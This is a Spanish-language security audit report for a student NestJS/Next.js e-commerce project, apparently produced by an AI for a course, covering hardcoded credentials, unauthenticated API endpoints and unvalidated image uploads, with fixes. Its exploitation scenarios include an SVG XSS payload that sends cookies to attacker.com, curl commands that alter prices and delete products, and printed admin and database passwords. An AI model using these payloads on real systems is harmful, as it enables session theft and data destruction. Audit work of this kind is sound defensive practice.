# Reporte de Vulnerabilidades de Seguridad

## Proyecto E-commerce - Ferretería v2

**Autor:** Sistema de Análisis de Seguridad  
**Fecha:** 19 de noviembre de 2025  
**Asignatura:** Seguridad en Sistemas Informáticos

---

## Resumen Ejecutivo

Este documento presenta el análisis de seguridad realizado sobre el sistema de e-commerce desarrollado con NestJS (backend) y Next.js (frontend), que integra la API de Transbank para pagos online. Se identificaron **3 vulnerabilidades críticas** que comprometen la seguridad de la aplicación.

---

## 1. VULNERABILIDAD CRÍTICA: Credenciales Hardcodeadas en el Código

### 📍 Ubicación

- **Archivo:** `frontend/contexts/AuthContext.tsx`
- **Líneas:** 51-52
- **Archivo:** `backend/docker-compose.yml`
- **Líneas:** 8-10

### 🔴 Severidad: **CRÍTICA**

### 📝 Descripción

El sistema tiene credenciales de acceso hardcodeadas directamente en el código fuente:

**Frontend - AuthContext.tsx:**

```typescript
const login = (email: string, password: string): boolean => {
  // Credenciales de administrador
  if (email === "diego@duoc.cl" && password === "password123") {
    const userData: User = {
      email,
      isAdmin: true,
    };
    setUser(userData);
    localStorage.setItem("user", JSON.stringify(userData));
    return true;
  }
  return false;
};
```

**Backend - docker-compose.yml:**

```yaml
environment:
  POSTGRES_USER: admin
  POSTGRES_PASSWORD: aiur1991
  POSTGRES_DB: prueba_postgres_db
```

### 💥 Impacto

- **Alto riesgo:** Cualquier persona con acceso al código fuente puede obtener credenciales de administrador
- **Exposición de base de datos:** Las credenciales de PostgreSQL están expuestas en el repositorio
- **Escalación de privilegios:** Un atacante puede autenticarse como administrador sin restricciones
- **Compromiso total del sistema:** Acceso completo a funciones administrativas (CRUD de productos, categorías, transacciones)

### 🎯 Escenario de Explotación

1. Atacante accede al código fuente (repositorio público en GitHub)
2. Identifica las credenciales hardcodeadas
3. Inicia sesión como administrador: `diego@duoc.cl / password123`
4. Obtiene permisos completos sobre el sistema
5. Puede modificar productos, precios, acceder a transacciones de clientes

### ✅ Recomendaciones

#### Solución Inmediata:

1. **Eliminar credenciales del código fuente**
2. **Implementar un sistema de autenticación real:**

   ```typescript
   // Usar JWT y bcrypt para hash de contraseñas
   import * as bcrypt from 'bcrypt';
   import { JwtService } from '@nestjs/jwt';

   async validateUser(email: string, password: string) {
     const user = await this.userRepository.findOne({ where: { email } });
     if (user && await bcrypt.compare(password, user.password)) {
       return user;
     }
     return null;
   }
   ```

3. **Variables de entorno para Docker:**

   ```yaml
   # docker-compose.yml
   environment:
     POSTGRES_USER: ${DB_USER}
     POSTGRES_PASSWORD: ${DB_PASSWORD}
     POSTGRES_DB: ${DB_NAME}
   ```

4. **Crear archivo .env (NO commitearlo):**

   ```bash
   DB_USER=admin
   DB_PASSWORD=contraseña_segura_generada
   DB_NAME=ferreteria_db
   ```

5. **Actualizar .gitignore:**
   ```
   .env
   .env.local
   .env.production
   docker-compose.override.yml
   ```

#### Mejores Prácticas:

- Usar gestores de secretos (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault)
- Implementar autenticación basada en JWT con refresh tokens
- Almacenar contraseñas con bcrypt (salt rounds >= 10)
- Implementar autenticación multifactor (MFA) para cuentas administrativas

---

## 2. VULNERABILIDAD ALTA: Ausencia Total de Autenticación y Autorización en API

### 📍 Ubicación

- **Controladores afectados:**
  - `backend/src/products/products.controller.ts`
  - `backend/src/categories/categories.controller.ts`
  - `backend/src/transactions/transactions.controller.ts`
  - `backend/src/coupons/coupons.controller.ts`
  - `backend/src/payment/payment.controller.ts`

### 🔴 Severidad: **ALTA**

### 📝 Descripción

La API REST del backend **NO implementa ningún mecanismo de autenticación ni autorización**. Todos los endpoints están completamente abiertos, incluyendo operaciones críticas como:

**Operaciones sin protección:**

```typescript
// Cualquiera puede crear, modificar o eliminar productos
@Post()
create(@Body() createProductDto: CreateProductDto) {
  return this.productsService.create(createProductDto);
}

@Delete(':id')
remove(@Param('id', IdValidationPipe) id: string) {
  return this.productsService.remove(+id);
}

// Cualquiera puede crear transacciones de pago
@Post('create')
async createPayment(
  @Body('amount') amount: number,
  @Body('buyOrder') buyOrder: string,
  @Body('sessionId') sessionId: string,
  @Body('returnUrl') returnUrl: string,
) {
  // Sin validación de usuario
}
```

### 💥 Impacto

- **Manipulación de datos:** Cualquier usuario puede crear, modificar o eliminar productos, categorías y cupones
- **Fraude financiero:** Posibilidad de crear transacciones falsas o manipular precios
- **Pérdida de inventario:** Modificación no autorizada de stock de productos
- **Violación de integridad de datos:** Sin control de quién modifica qué
- **Imposibilidad de auditoría:** No hay trazabilidad de las acciones

### 🎯 Escenario de Explotación

**Escenario 1 - Manipulación de Precios:**

```bash
# Atacante cambia el precio de un producto a $1
curl -X PUT http://localhost:3000/products/1 \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Martillo Premium",
    "price": 1,
    "inventory": 100
  }'
```

**Escenario 2 - Eliminación Masiva:**

```bash
# Script para eliminar todos los productos
for i in {1..100}; do
  curl -X DELETE http://localhost:3000/products/$i
done
```

**Escenario 3 - Cupones Fraudulentos:**

```bash
# Crear cupón de 100% descuento
curl -X POST http://localhost:3000/coupons \
  -H "Content-Type: application/json" \
  -d '{
    "code": "GRATIS100",
    "discount": 100,
    "expirationDate": "2026-12-31"
  }'
```

### ✅ Recomendaciones

#### Solución: Implementar Guards de NestJS con JWT

**1. Instalar dependencias:**

```bash
npm install @nestjs/jwt @nestjs/passport passport passport-jwt bcrypt
npm install -D @types/passport-jwt @types/bcrypt
```

**2. Crear JWT Guard:**

```typescript
// src/auth/guards/jwt-auth.guard.ts
import { Injectable } from "@nestjs/common";
import { AuthGuard } from "@nestjs/passport";

@Injectable()
export class JwtAuthGuard extends AuthGuard("jwt") {}
```

**3. Crear Role Guard:**

```typescript
// src/auth/guards/roles.guard.ts
import { Injectable, CanActivate, ExecutionContext } from "@nestjs/common";
import { Reflector } from "@nestjs/core";

@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.get<string[]>(
      "roles",
      context.getHandler()
    );
    if (!requiredRoles) return true;

    const { user } = context.switchToHttp().getRequest();
    return requiredRoles.some((role) => user.roles?.includes(role));
  }
}
```

**4. Proteger endpoints críticos:**

```typescript
// products.controller.ts
import { UseGuards } from '@nestjs/common';
import { JwtAuthGuard } from '../auth/guards/jwt-auth.guard';
import { RolesGuard } from '../auth/guards/roles.guard';
import { Roles } from '../auth/decorators/roles.decorator';

@Controller('products')
@UseGuards(JwtAuthGuard, RolesGuard) // Proteger todo el controlador
export class ProductsController {

  @Get() // Lectura pública
  findAll() { ... }

  @Post()
  @Roles('admin') // Solo administradores
  create(@Body() dto: CreateProductDto) { ... }

  @Put(':id')
  @Roles('admin')
  update(@Param('id') id: string, @Body() dto: UpdateProductDto) { ... }

  @Delete(':id')
  @Roles('admin')
  remove(@Param('id') id: string) { ... }
}
```

**5. Implementar sistema de usuarios y roles:**

```typescript
// src/users/entities/user.entity.ts
@Entity()
export class User {
  @PrimaryGeneratedColumn()
  id: number;

  @Column({ unique: true })
  email: string;

  @Column()
  password: string; // Hash bcrypt

  @Column({ type: "simple-array", default: "user" })
  roles: string[]; // ['user', 'admin']

  @CreateDateColumn()
  createdAt: Date;
}
```

#### Nivel de Protección Recomendado:

| Endpoint          | Método          | Acceso                                          |
| ----------------- | --------------- | ----------------------------------------------- |
| `/products`       | GET             | Público                                         |
| `/products`       | POST            | Admin                                           |
| `/products/:id`   | PUT             | Admin                                           |
| `/products/:id`   | DELETE          | Admin                                           |
| `/categories`     | GET             | Público                                         |
| `/categories`     | POST/PUT/DELETE | Admin                                           |
| `/transactions`   | GET             | Usuario autenticado (sus propias transacciones) |
| `/transactions`   | POST            | Usuario autenticado                             |
| `/payment/create` | POST            | Usuario autenticado                             |
| `/coupons`        | GET             | Público                                         |
| `/coupons`        | POST/PUT/DELETE | Admin                                           |

---

## 3. VULNERABILIDAD MEDIA-ALTA: Carga de Archivos Sin Validación

### 📍 Ubicación

- **Archivo:** `backend/src/upload-image/upload-image.service.ts`
- **Archivo:** `backend/src/products/products.controller.ts` (líneas 48-56)

### 🔴 Severidad: **MEDIA-ALTA**

### 📝 Descripción

El endpoint de carga de imágenes **NO valida el tipo de archivo, tamaño ni contenido** antes de subirlo a Cloudinary:

```typescript
@Post('upload-image')
@UseInterceptors(FileInterceptor('file'))
uploadImage( @UploadedFile() file: Express.Multer.File ) {
  if (!file) {
    throw new BadRequestException("La imagen es obligatoria")
  }
  // ❌ NO hay validación de tipo de archivo
  // ❌ NO hay validación de tamaño
  // ❌ NO hay validación de contenido
  return this.uploadImageService.uploadFile(file)
}
```

### 💥 Impacto

- **Ejecución de código malicioso:** Subida de archivos ejecutables (.exe, .sh, .bat)
- **Ataques XSS almacenados:** Archivos SVG con scripts maliciosos
- **Ataques XXE:** Archivos XML maliciosos en SVG
- **Consumo de recursos:** Subida de archivos enormes (DoS)
- **Costos económicos:** Abuso de la cuenta de Cloudinary
- **Almacenamiento de malware:** El servidor se convierte en repositorio de archivos maliciosos

### 🎯 Escenario de Explotación

**Escenario 1 - XSS mediante SVG:**

```svg
<!-- malicious.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Robo de cookies/tokens
    fetch('http://attacker.com/steal?data=' + document.cookie);
  </script>
  <text>Imagen aparentemente inocente</text>
</svg>
```

**Escenario 2 - DoS mediante archivo grande:**

```bash
# Generar archivo de 1GB
dd if=/dev/zero of=huge.jpg bs=1M count=1024

# Subir el archivo
curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@huge.jpg"
```

**Escenario 3 - Subida de ejecutable:**

```bash
# Subir un archivo malicioso
curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@malware.exe"
```

### ✅ Recomendaciones

#### Solución: Implementar Validación Completa de Archivos

**1. Crear Pipe de Validación:**

```typescript
// src/common/pipes/file-validation.pipe.ts
import { PipeTransform, Injectable, BadRequestException } from "@nestjs/common";

@Injectable()
export class FileValidationPipe implements PipeTransform {
  private readonly allowedMimeTypes = [
    "image/jpeg",
    "image/png",
    "image/webp",
    "image/gif",
  ];

  private readonly maxSizeInBytes = 5 * 1024 * 1024; // 5MB

  transform(file: Express.Multer.File) {
    if (!file) {
      throw new BadRequestException("No se proporcionó ningún archivo");
    }

    // Validar tipo MIME
    if (!this.allowedMimeTypes.includes(file.mimetype)) {
      throw new BadRequestException(
        `Tipo de archivo no permitido. Solo se aceptan: ${this.allowedMimeTypes.join(
          ", "
        )}`
      );
    }

    // Validar tamaño
    if (file.size > this.maxSizeInBytes) {
      throw new BadRequestException(
        `El archivo es demasiado grande. Tamaño máximo: ${
          this.maxSizeInBytes / 1024 / 1024
        }MB`
      );
    }

    // Validar extensión del nombre
    const allowedExtensions = [".jpg", ".jpeg", ".png", ".webp", ".gif"];
    const fileExtension = file.originalname
      .toLowerCase()
      .match(/\.[^.]*$/)?.[0];

    if (!fileExtension || !allowedExtensions.includes(fileExtension)) {
      throw new BadRequestException(
        `Extensión de archivo no permitida. Solo se aceptan: ${allowedExtensions.join(
          ", "
        )}`
      );
    }

    // Validar que el nombre no contenga caracteres peligrosos
    const dangerousChars = /[<>:"\/\\|?*\x00-\x1f]/g;
    if (dangerousChars.test(file.originalname)) {
      throw new BadRequestException(
        "El nombre del archivo contiene caracteres no permitidos"
      );
    }

    return file;
  }
}
```

**2. Aplicar validación en el controlador:**

```typescript
// products.controller.ts
import { FileValidationPipe } from '../common/pipes/file-validation.pipe';

@Post('upload-image')
@UseInterceptors(FileInterceptor('file', {
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 1
  }
}))
uploadImage(
  @UploadedFile(FileValidationPipe) file: Express.Multer.File
) {
  return this.uploadImageService.uploadFile(file);
}
```

**3. Validación adicional del contenido (magic numbers):**

```typescript
// src/common/utils/file-validator.util.ts
import * as fileType from "file-type";

export async function validateFileContent(buffer: Buffer): Promise<boolean> {
  const type = await fileType.fromBuffer(buffer);

  if (!type) {
    return false;
  }

  const allowedTypes = ["image/jpeg", "image/png", "image/webp", "image/gif"];
  return allowedTypes.includes(type.mime);
}
```

**4. Sanitización de nombres de archivo:**

```typescript
// upload-image.service.ts
import { v4 as uuidv4 } from 'uuid';
import * as path from 'path';

uploadFile(file: Express.Multer.File): Promise<CloudinaryResponse> {
  // Generar nombre seguro
  const safeFileName = `${uuidv4()}${path.extname(file.originalname)}`;

  return new Promise<CloudinaryResponse>((resolve, reject) => {
    const uploadStream = cloudinary.uploader.upload_stream(
      {
        public_id: safeFileName,
        resource_type: 'image',
        allowed_formats: ['jpg', 'png', 'webp', 'gif'],
        max_file_size: 5000000, // 5MB en bytes
      },
      (error, result) => {
        if (error) return reject(new Error(`Error al subir archivo: ${error.message}`));
        if (!result) return reject(new Error("No hay resultados desde Cloudinary"));
        resolve(result);
      }
    );
    streamifier.createReadStream(file.buffer).pipe(uploadStream);
  });
}
```

**5. Instalar dependencias necesarias:**

```bash
npm install file-type uuid
npm install -D @types/uuid
```

#### Configuración de Seguridad en Cloudinary:

```typescript
// upload-image.ts
export const UploadImageProvider = {
  provide: "CLOUDINARY",
  useFactory: () => {
    return cloudinary.config({
      cloud_name: process.env.CLOUDINARY_NAME,
      api_key: process.env.CLOUDINARY_API_KEY,
      api_secret: process.env.CLOUDINARY_API_SECRET,
      secure: true, // Usar HTTPS
      upload_preset: "secure_preset", // Configurar en Cloudinary
    });
  },
};
```

---

## 4. Vulnerabilidades Adicionales Identificadas (Menor Severidad)

### 4.1 Exposición de Información Sensible

- **Ubicación:** `backend/src/config/typeorm.config.ts`
- **Problema:** `synchronize: true` en producción
- **Riesgo:** Pérdida de datos en cambios de esquema
- **Solución:** Usar migraciones, `synchronize: false` en producción

### 4.2 Falta de Protección CSRF

- **Ubicación:** Todas las rutas POST/PUT/DELETE
- **Riesgo:** Ataques Cross-Site Request Forgery
- **Solución:** Implementar tokens CSRF con `csurf`

### 4.3 Sin Rate Limiting

- **Riesgo:** Ataques de fuerza bruta, DoS
- **Solución:** Implementar `@nestjs/throttler`

### 4.4 Headers de Seguridad Faltantes

- **Riesgo:** Clickjacking, XSS, MIME sniffing
- **Solución:** Usar `helmet` middleware

---

## Resumen de Prioridades

| #   | Vulnerabilidad                   | Severidad  | Prioridad | Esfuerzo |
| --- | -------------------------------- | ---------- | --------- | -------- |
| 1   | Credenciales Hardcodeadas        | CRÍTICA    | 🔴 Alta   | Bajo     |
| 2   | Sin Autenticación/Autorización   | ALTA       | 🔴 Alta   | Medio    |
| 3   | Carga de Archivos Sin Validación | MEDIA-ALTA | 🟡 Media  | Bajo     |
| 4   | Synchronize en Producción        | MEDIA      | 🟡 Media  | Bajo     |
| 5   | Sin CSRF Protection              | MEDIA      | 🟢 Baja   | Bajo     |
| 6   | Sin Rate Limiting                | MEDIA      | 🟢 Baja   | Bajo     |
| 7   | Headers de Seguridad             | BAJA       | 🟢 Baja   | Muy Bajo |

---

## Plan de Remediación Recomendado

### Fase 1 - Urgente (1-3 días)

1. ✅ Eliminar credenciales hardcodeadas
2. ✅ Mover configuraciones sensibles a variables de entorno
3. ✅ Actualizar .gitignore

### Fase 2 - Corto Plazo (1 semana)

1. ✅ Implementar sistema de autenticación JWT
2. ✅ Crear entidad User con roles
3. ✅ Proteger endpoints críticos con Guards
4. ✅ Implementar validación de archivos

### Fase 3 - Mediano Plazo (2 semanas)

1. ✅ Implementar rate limiting
2. ✅ Configurar helmet para headers de seguridad
3. ✅ Implementar CSRF protection
4. ✅ Configurar migraciones de TypeORM

### Fase 4 - Mejora Continua

1. ✅ Auditorías de seguridad periódicas
2. ✅ Monitoreo de dependencias con `npm audit`
3. ✅ Implementar logging de seguridad
4. ✅ Pruebas de penetración

---

## Referencias y Recursos

### Documentación Oficial:

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [NestJS Security](https://docs.nestjs.com/security/authentication)
- [NestJS Guards](https://docs.nestjs.com/guards)
- [Passport.js](http://www.passportjs.org/)

### Herramientas de Análisis:

- `npm audit` - Análisis de vulnerabilidades en dependencias
- `snyk` - Escaneo de seguridad
- OWASP ZAP - Testing de seguridad
- Burp Suite - Pruebas de penetración

### Estándares de Seguridad:

- CWE-798: Hardcoded Credentials
- CWE-306: Missing Authentication
- CWE-434: Unrestricted Upload of File

---

## Conclusiones

El análisis reveló vulnerabilidades críticas que requieren atención inmediata. Las **3 vulnerabilidades principales** documentadas son:

1. **Credenciales Hardcodeadas** - Compromiso total del sistema
2. **Ausencia de Autenticación/Autorización** - Acceso no autorizado a todas las funciones
3. **Carga de Archivos Sin Validación** - Riesgo de XSS, malware y DoS

Estas vulnerabilidades son **reales, documentables y demostrables** para tu asignatura. Cada una incluye:

- ✅ Código vulnerable específico
- ✅ Explicación técnica del problema
- ✅ Escenarios de explotación prácticos
- ✅ Impacto detallado
- ✅ Soluciones implementables con código

**Recomendación final:** Priorizar la remediación de las vulnerabilidades críticas antes de desplegar la aplicación en un entorno de producción.
